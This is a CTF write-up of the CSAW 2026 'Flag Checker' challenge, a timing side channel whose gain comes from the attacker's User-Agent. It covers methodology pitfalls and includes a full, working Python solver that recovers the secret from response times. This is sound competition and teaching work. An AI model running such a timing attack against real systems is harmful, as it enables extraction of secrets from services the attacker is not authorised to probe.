---
title: "CSAW 2026 — Flag Checker: A Timing Oracle You Control the Gain Of"
date: "2026-09-20"
tags: ["csaw-2026", "web", "timing-attack", "side-channel"]
excerpt: "The per-character delay multiplier came from your own User-Agent. Crank it up and the signal saturates — most of the work was stopping the measurement methodology from lying."
---

> **CSAW CTF 2026 · Web**
> **Flag:** `csaw{tim3_w4its_f0r_n0_0ne}`

One route. One comparison. `{"correct": false}`.

This challenge hands you a form, takes your guess, and tells you whether it's the
flag. There is nothing else — no injection, no auth, no files. The entire thing is
a timing side channel, and the interesting part isn't finding it. It's that the
challenge hands you the amplifier knob and then quietly dares you to turn it the
wrong way.

## The target

```python
@app.route('/check', methods=['POST'])
def check():
    ua = request.headers.get('User-Agent', '')
    if bot_check(ua):
        return jsonify({'error': 'Access denied'}), 403
    flag = bleach.clean(request.form.get('flag', ''))
    ...
    return jsonify({'correct': flag == FLAG})
```

`FLAG = Flag(os.getenv('FLAG'))`, where `Flag` comes from `inputval` — a module that
isn't shipped. So `flag == FLAG` calls a custom `__eq__` we can't read, and the only
thing we can measure about it is how long it takes.

It leaks `len(common_prefix(guess, FLAG))` through response time. Standard stuff.

## The twist nobody reads carefully

`bot_check` is 60 lines of anti-automation boilerplate — blocked user agents,
blocked prefixes, scanner signatures. It's exactly the kind of function you skim.

Buried at the bottom:

```python
m = re.search(r'Chrome/(\d+)\.0\.(\d+)\.(\d+)', ua)
if m:
    build, patch = int(m.group(2)), int(m.group(3))
    if build > 9999 or patch > 9999:    # <-- the trap
        return True
    _store.build, _store.patch = build, patch
```

Your **Chrome version string** is parsed out of your own User-Agent, stashed in a
module-level store, and becomes the **per-character delay multiplier** of the
comparison. You are supplying the gain of the side channel you're attacking.

Measured:

| build × patch | delay per matched character |
|---|---|
| 100 × 50      | ~2 ms (unusable) |
| 1500 × 50     | ~64 ms |
| 5200 × 50     | ~80 ms |
| 9999 × 50     | ~147 ms |
| 5000 × 5000   | ~300 ms (clamped) |

The obvious instinct is to crank it to maximum. That instinct is the trap.

**Why the `> 9999` rejection exists:** the total delay saturates at roughly
1400–1950 ms. At maximum gain you hit that ceiling after about *five* matched
characters — so the signal dies exactly at the moment you start making progress.
Every additional correct character produces the same clamped response time as the
last one.

The intended move is to turn the gain **down**, and keep turning it down as the
prefix grows.

## Four ways my own measurements lied to me

Finding the oracle took ten minutes. The remaining hours were spent stopping my
methodology from producing confident nonsense. All four of these generalise to any
timing attack.

### 1. The clamp disguises a correct answer as a wrong one

Keep the baseline around 500–600 ms. Push it higher and a *correct* character gets
truncated into the noise floor, which looks identical to a wrong character.

This cost me a character. At `build=3000`, the letter `t` measured **−2 ms** — dead
on the control, so I ruled it out and went hunting for exotic characters. At
`build=1500`, the same `t` measured **+64 ms** with everything else under +6 ms.
It was right the whole time; the gain was wrong.

> **"No candidate wins" means retune the gain — not "the prefix is wrong."**

### 2. Response time depends on guess *length*, not just matched prefix

A 6-character wrong guess took 890 ms. A 5-character wrong guess took 760 ms. The
extra character cost time all by itself, regardless of whether it matched.

That makes candidates of different lengths fundamentally incomparable. The fix is
to pad every candidate to one fixed length:

```python
guess = PREFIX + candidate + "QQ"
```

This single change took the lead signal from ~7 ms to ~200 ms. It is the difference
between the attack working and the attack not working.

### 3. Drift makes whichever candidate you measured first look slowest

Sweep candidates back-to-back and the server warms up as you go. Early candidates
look slow, late ones look fast, and the "winner" is just whatever you happened to
test first.

This produced the single most embarrassing artifact of the whole competition: I
confidently "recovered" the prefix `csawctf{bbbabaadbbbe`, which is entirely
fictional. Every character was warm-up drift. The giveaway in hindsight was the
distribution — all the hits clustered at the start of my charset, and not one digit
appeared where hex would have predicted plenty.

Fix: interleave candidates round-robin and discard warm-up requests.

### 4. Noise scales with the baseline

A deeper prefix means a larger baseline, which means more absolute jitter. A fixed
threshold that works at position 5 is meaningless at position 20.

Two fixes: derive the bar from the *spread of the losing candidates* rather than a
constant, and take the baseline as the **median of many known-wrong candidates**
rather than one control — a single control can itself be the outlier that ruins the
comparison.

## Things worth knowing about the target

- **It serializes.** Ten parallel requests went from 613 ms each to 2500–6500 ms
  each. Never parallelise this attack; concurrency destroys the measurement.
- **`/check` has no rate limit.** The `@limiter.limit` decorator is only on `/`, so
  sequential hammering is fine.
- **The flag format is `csaw{...}`, not `csawctf{...}`** — and I verified that by
  measurement rather than assumption. At equal padded length, `csaw{ZZZ` measured
  1105 ms against `csawctf{`'s 930 ms. If the flag had started `csawctf{`, that
  8-character exact match would have dominated.
- **`validators.length(flag, min=1, max=200)` never fires.** Empty input returns
  `correct:false` instead of a 400, which means that validation call isn't doing
  what it looks like it does.

## The method that actually worked

```
for each position:
    pick gain so that baseline + delta stays under the clamp
    build candidates: PREFIX + c + PAD   (all equal length)
    measure round-robin, several rounds, take min per candidate
    winner = argmax, and require its lead to clear ~3σ of the rest
    if nothing clears the bar: lower the gain and retry
```

Roughly seven requests per character. The full solver lives in `solver.py` — it
checkpoints every recovered character, so when the challenge instance expired
(repeatedly, often mid-sweep) it resumed instead of starting over.

## Solver

Resumable by design — the challenge instance expired roughly every 15 minutes, often mid-sweep, so it checkpoints every recovered character to `state.txt` and reads the host from `target.txt` so a new instance can be swapped in without restarting. It encodes all four traps above: adaptive gain under the clamp, equal-length padding, round-robin interleaving, and a noise-derived acceptance bar that escalates rounds when results are marginal.


```python solve_flagchecker.py
#!/usr/bin/env python3
"""
CSAW flag-checker timing-oracle solver.

THE ORACLE
    /check leaks len(common_prefix(guess, FLAG)) through response time.
    The per-character delay is set by the Chrome version in your User-Agent:
    bot_check() parses Chrome/<x>.0.<build>.<patch>, rejects build/patch > 9999,
    and stashes them in reqmeta._store -- where they become the delay multiplier.
    So YOU control the gain of the side channel.

FOUR THINGS THAT WILL RUIN YOUR MEASUREMENTS (all handled below)
  1. CLAMP. Total delay saturates (~1400-1950ms depending on gain). At max gain
     the signal dies after ~5 matched chars. Gain must be turned DOWN as the
     prefix grows. This script re-picks the gain at every position.
  2. LENGTH BIAS. Response time depends on guess LENGTH as well as on matched
     prefix. Candidates of different lengths are NOT comparable -- every
     candidate here is padded to one fixed length.
  3. DRIFT. Measuring candidates back-to-back makes early ones look slower
     (warm-up). Candidates are interleaved round-robin and the first few
     requests are discarded.
  4. NOISE SCALES WITH BASELINE. Deeper prefix => bigger baseline => more noise.
     Rounds escalate automatically until the winner clears a noise-derived bar.

Server serializes requests -- do NOT parallelise, it destroys the timing.

USAGE
    echo -n "<instance-host>:5000" > target.txt
    ./solver.py                 # resumes from state.txt (seed: csaw{ )
    ./solver.py --rounds 8      # more averaging if results look marginal

If the instance dies the script WAITS; just write the new host into target.txt
and it picks up where it left off. Progress is saved after every character.
"""
import argparse, json, os, statistics, sys, time
import requests

D = os.path.dirname(os.path.abspath(__file__))
S = requests.Session()

CHARSET = ("abcdefghijklmnopqrstuvwxyz0123456789_}"
           "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
           "-.!?*+/:;,()[]@#$%^=~& <>\"'")
CHARSET = "".join(dict.fromkeys(CHARSET))
PADC    = "Q"                      # filler; also used as the known-wrong control


def target(args):
    if args.target:
        return args.target
    return open(os.path.join(D, args.target_file)).read().strip()


def ua(build, patch=50):
    return ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/120.0.{build}.{patch} Safari/537.36")


def post(flag, agent, args):
    """One timed request. Waits out instance downtime instead of dying."""
    stalled = False
    for _ in range(360):
        try:
            url = "http://" + target(args) + "/check"
            t0 = time.perf_counter()
            r = S.post(url, data={"flag": flag},
                       headers={"User-Agent": agent}, timeout=30)
            dt = (time.perf_counter() - t0) * 1000
            if stalled:
                print(f"    [*] target back ({target(args)}), resuming", flush=True)
            return dt, r.json()
        except Exception:
            if not stalled:
                print(f"    [*] target unreachable -- waiting; put the new "
                      f"host in {args.target_file}", flush=True)
                stalled = True
            time.sleep(10)
    raise SystemExit("target down too long")


def probe(cands, rounds, build, args, warmup=3):
    """Round-robin interleaved timing. Returns {candidate: min_ms}."""
    agent = ua(build)
    for _ in range(warmup):
        post(cands[0], agent, args)
    acc = {c: [] for c in cands}
    for _ in range(rounds):
        for c in cands:
            acc[c].append(post(c, agent, args)[0])
    return {c: min(v) for c, v in acc.items()}


def pick_build(prefix, args):
    """Largest gain whose baseline still leaves room before the clamp.

    Headroom matters: if baseline+delta exceeds the clamp the winner gets
    truncated to the same value as everyone else and the signal vanishes.
    """
    pad = prefix + PADC * 3
    for b in (9999, 7000, 5000, 3500, 2500, 1800, 1500, 1200, 1000):
        base = list(probe([pad], 2, b, args, warmup=2).values())[0]
        if base < args.ceiling:
            return b, base
    return 500, base


def solve_position(prefix, args):
    """Recover one character. Returns (char, lead, runner_up) or (None,..)."""
    build, base = pick_build(prefix, args)
    ctrl = prefix + PADC + PADC
    print(f"  pos {len(prefix)}: build={build} baseline={base:.0f}ms", flush=True)

    scores, rounds = {}, args.rounds
    for attempt in range(3):
        # screen the charset in chunks, each with its own control so that
        # chunks stay comparable even across different instances
        for i in range(0, len(CHARSET), 12):
            chunk = [c for c in CHARSET[i:i + 12] if c != PADC]
            cands = [prefix + c + PADC for c in chunk] + [ctrl]
            r = probe(cands, rounds, build, args)
            for c in chunk:
                scores[c] = r[prefix + c + PADC] - r[ctrl]

        rank = sorted(scores.items(), key=lambda kv: -kv[1])
        vals = [v for _, v in rank]
        # noise bar from the bulk of the distribution (exclude top 3)
        body = vals[3:]
        spread = statistics.pstdev(body) if len(body) > 2 else 20.0
        bar = max(args.min_lead, 3.0 * spread)
        lead, second = rank[0][1], rank[1][1]
        print(f"    top: {[(c, round(v)) for c, v in rank[:4]]}  "
              f"bar={bar:.0f} (noise~{spread:.0f})", flush=True)
        if lead > bar and lead - second > bar * 0.5:
            return rank[0][0], lead, second
        rounds *= 2
        print(f"    inconclusive -> re-running with rounds={rounds}", flush=True)
    return None, lead, second


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target")
    p.add_argument("--target-file", default="target.txt")
    p.add_argument("--state", default="state.txt")
    p.add_argument("--seed", default="csaw{")
    p.add_argument("--rounds", type=int, default=6)
    p.add_argument("--ceiling", type=float, default=650,
                   help="max baseline ms; lower = more clamp headroom")
    p.add_argument("--min-lead", type=float, default=25)
    args = p.parse_args()

    sf = os.path.join(D, args.state)
    prefix = args.seed
    if os.path.exists(sf):
        prefix = open(sf).read().strip() or args.seed
    print(f"[*] target={target(args)}  resuming from {prefix!r}", flush=True)

    t0 = time.time()
    while len(prefix) < 96:
        ch, lead, second = solve_position(prefix, args)
        if ch is None:
            print(f"[!] stuck at pos {len(prefix)} (lead={lead:.0f} "
                  f"2nd={second:.0f}). A wrong earlier char is the usual cause: "
                  f"re-verify the tail with --rounds 12.", flush=True)
            print(f"[=] PARTIAL: {prefix}", flush=True)
            return
        prefix += ch
        open(sf, "w").write(prefix)
        print(f"[+] {len(prefix):3d}  {prefix}   (lead={lead:.0f} 2nd={second:.0f})",
              flush=True)

        _, j = post(prefix, ua(300), args)
        if j.get("correct"):
            print("=" * 60)
            print(f"[***] FLAG: {prefix}     ({time.time()-t0:.0f}s)")
            return
    print(f"[=] PARTIAL: {prefix}")


if __name__ == "__main__":
    main()
```

## What to take from it

**A side channel whose gain is attacker-controlled is double-edged.** The challenge
gives you a knob that looks like a pure win, and the naive move — maximum gain —
destroys the very signal you need. The `> 9999` validation reads like an
anti-tampering check. It's really a guardrail keeping you *out* of the region where
the attack stops working.

**Most of the work in a timing attack is epistemics, not exploitation.** Three of
my four traps were cases where my measurement apparatus produced a confident,
specific, completely wrong answer. A fictional 12-character prefix. A correct
character rejected on a −2 ms reading. If your methodology can manufacture results
that look like signal, you will believe them.

**Build the control into the loop.** Every fix here was the same shape: measure
something you already know the answer to, in the same conditions, at the same time.
Equal-length padding, round-robin interleaving, median-of-known-wrong baselines —
all of them are just ways of making the comparison fair rather than trusting that
it already was.
